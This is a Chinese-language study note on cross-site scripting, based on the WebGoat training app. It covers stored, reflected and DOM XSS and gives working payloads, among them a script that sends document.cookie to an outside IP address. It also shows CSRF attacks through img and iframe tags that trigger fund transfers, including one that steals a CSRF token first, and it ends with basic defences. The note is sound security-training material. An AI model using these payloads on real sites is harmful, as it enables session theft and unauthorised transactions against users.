# XSS学习笔记

## 0x00 前言
看WebGoat的XSS部分总结的一部分东西，算是XSS入门  
WebGoat的git地址：https://github.com/WebGoat/WebGoat/  


## 0x01 概念
Cross Site Scripting， 跨站脚本攻击，将恶意脚本注入到可信网站，获取其他用户信息或权 限。由于缩写 CSS 一般认知为层叠样式表(Cascading Style Sheets)，所以缩写为 XSS  


## 0x02 种类
1. Stored XSS（Persistent or Type-I XSS）  
    存储, 再次访问触发 
2. Reflected XSS（Non-Persistent or Type-II XSS）  
    直接触发  
3. DOM Based XSS（Type-0）  
    在浏览器的解析中改变页面 DOM 树, 且恶意代码不在返回页 面源码中回显   

注：12 年之前这么分，后来分成了 Client XSS 和 Server XSS  


## 0x03 结合 WebGoat 的 XSS 实例介绍 

### Stored XSS Attacks
**情景**：   
一个公共的留言板，所有用户可发布留言，可查看留言  
**过程**：  
A. 用户发布留言如下：   
    标题: hello(随意写)  
    内容: `<script>alert("Hacked!");</script>`   
B. 用户浏览此留言，出现弹窗  

### Reflected XSS Attacks 
**情景**：   
一个搜索框，输入内容之后回车，会提示 内容+搜索结果，如 搜索 hello，提示 hello 未找到   
**过程**：  
输入`<script>alert("Hacked!");</script>`，回车，出现弹窗  
**类似输入**：  
`<script>alert(document.cookie);</script>` 弹出 cookie  
 `<script>alert(document.form.field2.value);</script>` 弹出某个表单的 input 的值  
 
### DOM XSS Attacks
修改 dom 树  
**过程**：  
构造如下  
```html
<script> 
    Var img= document.createElement("img"); 
    img.src = "http://10.10.10.151:1234/a?" + escape(document.cookie); 
</script> 
```

即可实现窃取 cookie 的目的  


## 0x04 对 XSS 的防御
1. 对输入进行过滤，对输出进行编码  
    特殊字符编码： 
    ```
    &-->&amp; 
    <-->&lt; 
    >-->&gt; 
    "-->&quot; 
    '-->&#x27; 
    /-->&#x2F; 
    ```
2. 使用 httponly 保护 cookie，使 js 脚本不能读写 cookie  


## 0x05 利用 XSS 实现 CSRF
CSRF，Cross Site Request Forgery， 跨站请求伪造，这里介绍通过 XSS 实现的 CSRF  
攻击者构造一个特殊链接(或者特殊的 img 标签等), 然后发给受害者(想办法让这个链接出现在受害者的页面), 受害者点击之后(或者只要加载即可), 这个链接可能就会带着受害者的身份信 息发起一次受害者不知道的却已经授权的请求  

### 最基本CSRF
伪造图片，实际上使受害者访问特定链接：  
`<img src="attack?Screen=XXX&menu=YYY&transferFunds=5000"> `  
图片加载就会访问此链接  

### 有消息回传的 CSRF
有提示的 CSRF, 也就是在 CSRF 被触发后, 会再触发一次请求传给攻击者, 提示漏洞已被 触发，或者说攻击已执行  

1. 使用 iframe 实现：  
    ```html
    <iframe 
        src="http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=5000" 
        id="myFrame" frameborder="1" marginwidth="0" marginheight="0" width="800" scrolling=yes height="300" 
        onload="document.getElementById('frame2').src='http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=CONFIRM';">
    </iframe>
    <iframe id="frame2" frameborder="1" marginwidth="0" marginheight="0" width="800" scrolling=yes height="300">
    </iframe>
    ```
2. 使用 img 实现：  
    ```html
    <img  
        src="http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=5
        000"  
        onerror="document.getElementById('image2').src='http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=CONFIRM'"> 
    <img id="image2"> 
    ```

### 窃取Token的CSRF
有些表单提交会有 CSRF Token，用来防止 CSRF 攻击，如果足够了解受害者浏览页面，在 发动攻击的时候也可以窃取 Token  
```html
<script> 
    var tokensuffix; 
 
    function readFrame1() { 
        var frameDoc = document.getElementById("frame1").contentDocument; 
        var form = frameDoc.getElementsByTagName("form")[0]; 
        tokensuffix = '&CSRFToken=' + form.CSRFToken.value; 
 
        loadFrame2(); 
    } 
 
    function loadFrame2() { 
        var testFrame = document.getElementById("frame2"); 
        testFrame.src = "http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=5000" + tokensuffix; 
    } 
</script> 
 
<iframe  
    src="http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=main"  
    onload="readFrame1();" id="frame1" 
    frameborder="1" marginwidth="0" marginheight="0" width="800" scrolling=yes height="300"> 
</iframe> 
<iframe id="frame2" frameborder="1" marginwidth="0" marginheight="0" width="800" scrolling=yes height="300"></iframe> 
```


---
2017/12/19  
